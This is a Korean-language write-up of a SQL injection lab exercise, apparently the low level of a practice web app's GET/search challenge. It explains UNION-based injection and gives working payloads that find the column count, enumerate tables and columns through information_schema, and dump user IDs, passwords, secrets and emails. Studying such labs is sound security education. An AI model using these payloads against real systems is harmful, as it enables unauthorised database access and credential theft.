## SQL Injection(GET/search)

![Typora_mkexMVVA8o](https://user-images.githubusercontent.com/79683414/134788279-d70368d4-90f2-415b-96fb-9120fdc4835d.png)

### _SQL Injection 이란_

사용자가 데이터를 입력하는(DB Query를 날리는)곳에 SQL 쿼리를 입력하여

개발자가 의도하지 않은 동작을 하는 것.

웹에서 사용자가 데이터를 입력할 수 있는 대부분의 것들은 DB와 연동되므로,

OWASP TOP10 에 항상 들어가는 취약점이다.

주로 `', UNION, #, --, OR` 등을 이용하여 위조된 Query를 보낸다.

이번 문제에서 이용되는 SQL Query 는 다음과 같을 것이다.

<br/>

<br>

`SELECT ???? FROM movies? WHERE title='<user_input>';`

<br>

<br>

따라서 Input 에 `' or 1=1` 을 입력하면 해당 테이블의 모든 튜플이 출력될 것이다.

하지만 해당 테이블에는 추가적으로 노출되는 정보가 없어서 적절하지 않다.

<br>

<br>

'or'을 이용한 공격은 "해당"테이블(movies?)의 모든 튜플을 출력하지만,

UNION을 이용하면 " __원하는 테이블__ "의 정보를 출력할 수 있다.

<br>

<br>

## UNION ?

UNION은,

복수의 SELECT 구문의 결과를 결합하여 하나로 반환한다.

조건은 각 SELECT 구문의 칼럼의 수(열의 개수, 차수, degree)가 같아야 한다.

내 방식대로 표현하자면,

테이블을 밑변을 기준으로 합치는 것이다.

<br>

<br>

칼럼의 수가 다른 경우

![Hwp_Int2BuJ1pI](https://user-images.githubusercontent.com/79683414/134789893-86af1114-62da-4643-b260-06cfbbc1bd43.png)

<br>

<br>

칼럼의 수가 같은 경우

![Hwp_qdavP8mKoT](https://user-images.githubusercontent.com/79683414/134789902-59ba530f-c37c-4099-a7ad-05cd0fb0713e.png)

<br>

<br>

앞서 "UNION을 이용하면 원하는테이블의 정보를 출력할 수 있다"고 언급했는데,

이번 문제에서 사용된 QUERY 를 보면서 이해해보자.

`SELECT ???(column) FROM ???(table) WHERE title='<user_input>'...`

<br>

Input으로 ` 0' UNION SELECT ??? FROM user ...#` 을 입력하면

Query 는 다음과 같다.

`SELECT ???(column) From ???(table) WHERE title='0' UNION SELECT ??? FROM user ...#`

<br>

___두 SELECT 의 column의 수가 같다면___,

첫 번째 SELECT 의 결과는 EMPTY 이므로, 두 번째 SELECT 의, user table의 결과만 출력될 것이다.

따라서, 첫 번째 "SELECT 의 column 의 수" 만 알아내면 임의의 Table의 정보를 출력할 수 있게 된다.

임시로 테이블을 만들어서 직접 테스트 해보자.

<br>

<br>

![WindowsTerminal_7AUUlbLt3x](https://user-images.githubusercontent.com/79683414/134790651-b0d2b1a2-a8f4-4746-937e-6dc7bc4186d8.png)

Column의 수가 같으면 정상적으로 결합되지만 그렇지 않은 경우 Error 가 출력되는 것을 볼 수 있다.

앞부분에 0 을 붙이면 두 번째 SELECT 결과만 출력할 수 있다.

<br>

<br>

![WindowsTerminal_7WHyIDkWd4](https://user-images.githubusercontent.com/79683414/134790753-782bad8c-0a46-48e0-aca5-1fac985f7d23.png)

<br>

<br>

## low

우선, `', 'or 1=1#` 을 이용해서 SQL Injection 이 가능한지 확인해보자.

![chrome_dyz7a5u5uo](https://user-images.githubusercontent.com/79683414/134790794-2a8e75d9-439e-47a8-8cf6-d883da1deb3d.png)

![chrome_4WHYBTQLOF](https://user-images.githubusercontent.com/79683414/134790858-b05026ad-5613-4e22-96a5-3ddabfd22e97.png)

<br>

<br>



인젝션 공격이 가능하므로, "UNION" 을 이용해 Column 수를 확인해보자.

![chrome_EPDCLvpfUj](https://user-images.githubusercontent.com/79683414/134790906-57566386-27c0-4926-b8c9-f8b4c0e7e5c1.png)

<br>

<br>

참고로, 아래의 내용을 이용하여 정보를 수집할 수 있다.

```bash
database()		데이터베이스 이름
user()			현재 사용자의 아이디
system_user()		최고 권한 사용자의 아이디
@@version		데이터베이스 서버의 버전
@@datadir		데이터베이스 서버가 존재하는 디렉터리
```

`0'UNION SELECT 1,database(),user(),system_user(),@@version,6,7#`

![chrome_mYnO0ZvfZC](https://user-images.githubusercontent.com/79683414/134791179-3ec3d03b-6755-4e39-af56-af58e998d81f.png)

<br>

<br>

결과를 확인해보니 Column의 수는 7 이고 2,3,4,5의 결과를 출력하는 듯 하다.

Column의 수를 알아냈으니 이제 원하는 테이블의 정보를 출력할 수 있다.

여기서 출력할 테이블은 바로, MySQL 에서 기본적으로 내장되어있는 information_schema 이다.

information_schema 에는 여러가지 정보가 저장되어 있는데 그 중, 테이블의 이름, 칼럼명 등을 이용하면 계정정보, 비밀번호, 메일 등의 정보를 알아낼 수 있다.![WindowsTerminal_GDaud6c5L6](https://user-images.githubusercontent.com/79683414/134791408-e4040100-10f9-4992-ab33-d4807b0892ae.png)

> __Information_schema table reference__
>
> https://dev.mysql.com/doc/refman/8.0/en/information-schema-table-reference.html

<br>

<br>

information_schema.tables 에는 모든 테이블들의 이름이 저장된 "table_name" 칼럼이 있다.

`0' UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables#`

![chrome_lXKA7Ckbwx](https://user-images.githubusercontent.com/79683414/134791485-70dca5d0-cc50-4276-870d-1aad9827c010.png)

<br>

<br>

이렇게 모든 테이블의 이름이 출력되는데, 계정 정보가 저장되어 있는 user 테이블을 확인해 보자.

information_schema.columns 에는 모든 테이블의 column 명이 저장된 column_name 칼럼이 있다.

`0' UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_name='users'#`

![chrome_qDiDoal6g5](https://user-images.githubusercontent.com/79683414/134791580-d317428b-118e-4510-a1c1-b704820f05c5.png)



<br>

<br>

이렇게 user 테이블의 칼럼 정보를 획득했다.

다음은 원하는 정보를 출력해보자.

`0' UNION SELECT 1,concat(id,login),password,secret,email,activation_code,7 FROM users #`

![chrome_3PES9myt7j](https://user-images.githubusercontent.com/79683414/134791632-aa999466-cb17-43a4-934a-a7cab1666d98.png)

<br>

<br>

UNION 과 Information_schema 를 적절히 활용하면 원하는 정보를 획득 할 수 있다.